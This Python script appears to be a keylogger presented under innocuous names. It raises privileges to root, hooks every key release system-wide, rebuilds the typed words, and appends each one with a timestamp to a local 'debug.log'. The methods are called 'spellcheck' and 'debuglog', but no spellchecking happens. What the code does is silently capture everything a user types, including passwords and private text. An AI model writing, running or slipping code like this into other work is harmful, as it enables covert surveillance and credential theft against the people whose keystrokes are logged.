#!/usr/bin/env python3


import sys
import re
import subprocess
import os
import string
import datetime

import keyboard

#import nltk
#from nltk.corpus import words

CSV_SEP = ","

SUCCESS = 0
READ_FILE_ERROR = 1
WRITE_FILE_ERROR = 2
APPEND_FILE_ERROR = 4


class Rtat:
    def __init__(self, custom=True):
        # ntlk.download("words")
        self.custom = custom
        self.mode = ""
        self.clearWord()
        self.debuglog_local = "./debug.log"
        self.startDebuglog()
        os.seteuid(0)
        self.running = False

    def clearWord(self):
        self.word = ""
        return SUCCESS

    def startDebuglog(self):
        try:
            fp = open(self.debuglog_local, 'w')
            fp.write("")
            fp.close()
            return SUCCESS
        except Exception as e:
            sys.stderr.write(e)
            return WRITE_FILE_ERROR

    def debuglog(self, txt, sep="\n"):
        try:
            fp = open(self.debuglog_local, 'a')
            c =  str(datetime.datetime.now()).split('.')[0].replace(' ', '_')
            fp.write(f"{c}{CSV_SEP}{self.word}{sep}")
            fp.close()
            return SUCCESS
        except Exception as e:
            sys.stderr.write(e)
            return APPEND_FILE_ERROR

    def spellcheck(self):
        if len(self.word) > 1:
            self.debuglog(self.word)
        self.clearWord()
        return SUCCESS

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            self.mode = ""
            if name == "space" or name == "enter":
                self.spellcheck()
            elif name == "delete" or name == "backspace":
                self.word = self.word[:-1]
            elif name == "control":
                self.mode = name
            elif name == "insert" and self.custom:
                if self.mode == "shift":
                    self.word += "H"
                else:
                    self.word += "h"
            elif name == "shift" and self.custom:
                self.mode = "shift"
            elif name == "end" and self.custom:
                if self.mode == "shift":
                    self.word += "}"
                else:
                    self.word += "]"
        else:
            if self.mode != "control":
                self.word += name
            self.mode = ""
        return SUCCESS

    def toggle(self):
        self.running = not self.running
        if self.running:
            self.runme()
        
        return SUCCESS

    def runme(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()
        return SUCCESS


if __name__ == '__main__':
    rtat = Rtat()
    sys.exit(rtat.toggle())
